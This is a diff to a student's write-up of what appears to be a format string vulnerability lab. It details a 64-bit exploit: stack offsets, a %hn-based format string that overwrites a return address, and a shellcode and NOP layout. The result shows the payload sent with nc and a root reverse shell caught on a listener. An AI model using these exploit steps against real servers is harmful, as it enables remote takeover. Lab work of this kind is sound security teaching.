@@ -168,7 +168,7 @@
     - approach 2 (easier, but require that the server prints out the value of `ebp` inside `myprintf()`)
         - the value of `ebp` is printed out by the server (it's `0xffffd168`), the return address should be `$ebp+4=0xffffd16c`
 
-- then construct the payload, reuse the payload in task `3.C`, and append the shellcode, for convenience, put the shellcode in the final part of the payload (`[1500-len(shellcode), 1500]`), and the new return address can be `0xffffd240 + (1500-len(shellcode))`, it's ok to return to some bytes before this address, because we will fill those area with NOPs (`0x90`), here I used `0xffffd240+1000=0xffffd628`
+- then construct the payload, reuse the payload in task `3.C`, and append the shellcode, for convenience, put the shellcode in `[1000, len(shellcode)+1000]`, and the new return address can be `0xffffd240+1000`, it's ok to return to some bytes before this address, because we will fill those area with NOPs (`0x90`), here I used `0xffffd240+1000=0xffffd628`
     - we need to modify the value at address `0xffffd16c` to `0xffffd628`, specifically, modify the higher 2 bytes to `0xffff`, and the lower 2 bytes to `0xd628`
     - the core payload is 
         1. `0xffffd16c`
@@ -188,8 +188,58 @@
     ```
 
 ## Task 5: Attacking the 64-bit Server Program
-- it would be more complex to modify a 64-bit value, but we can still do it with four `%hn`
+- it would become a bit more complex to modify a 64-bit value, but we can still do it with more `%hn`
+- the problem is that in `64-bit` addresses, the first 2 bytes are always `0x0000`, if we put the addresses at the beginning of the buffer, `printf()` will not print contents after the first `0x00`, the solution is to put them after all placeholders, and we need to use more `%lx` (for 64-bit values) to reach them
 
+- first, we need to know with how many `%lx` we can get the first 8 bytes in the input buffer, just like task `2.A`, the answer is `34`
+
+- get the address of return address, it's `0x00007fffffffe0b8` (`0x00007fffffffe0b0 + 0x8`, `0x00007fffffffe0b0` is the value of `rbp`)
+
+- we can still put then shellcode in `[1000, len(shellcode)+1000]`, so the return address can be `0x00007fffffffe558` (`0x00007fffffffe170 + 1000`, `0x00007fffffffe170` is the address of input buffer)
+
+- the format string is
+    - `s = "%.16lx"*147 + "%.30415lx" + "%hn" + "%.25945lx" + "%hn" + "%.6823lx" + "%hn"`
+- the addresses are stored after offset `920` in the buffer
+- `920` is carefully selected, it ensures there is enough space for the format string (in my case, the length of `s` is `917` in bytes, but actually it is also easy to make it shorter, e.g., change `"%.16lx"*147` to `"%.32lx"*73 + "%.16lx"`)
+
+- here is the layout of my input buffer in memory
+    ```
+    High Memory Addresses
+    |      +--------------------------+
+    |      |           ...            |
+    |      +--------------------------+
+    |      |        shellcode_64      |
+    |      |--------------------------| <-- offset=1000
+    |      |            NOPs          |
+    |      |--------------------------| <-- offset=960
+    |      |    0x00007fffffffe0b8    |
+    |      |--------------------------| <-- offset=952
+    |      |          padding         |
+    |      |--------------------------| <-- offset=944
+    |      |    0x111111119add1009    |
+    |      |--------------------------| <-- offset=936
+    |      |          padding         |
+    |      |--------------------------| <-- offset=928
+    |      |    0x00007fffffffe0bc    |
+    |      |--------------------------| <-- offset=920
+    |      |           ...            |
+    |      |--------------------------|
+    |      |       format string      |
+    |      +--------------------------+ <-- offset=0
+    |      |           ...            |
+    |      +--------------------------+
+    Low Memory Addresses
+    ```
+
+- result
+    ```
+    $ ./exp64.py
+    $ cat badfile | nc 10.9.0.1 9090
+    ```
+    ```
+    $ nc -l 9875
+    root@a0349527f3e6:/fmt# <---- get a root shell
+    ```
 
 ## Task 6: Fixing the Problem
 - a straight forward fix for the problem is to modify `printf(msg)` to `printf("%s", msg)`
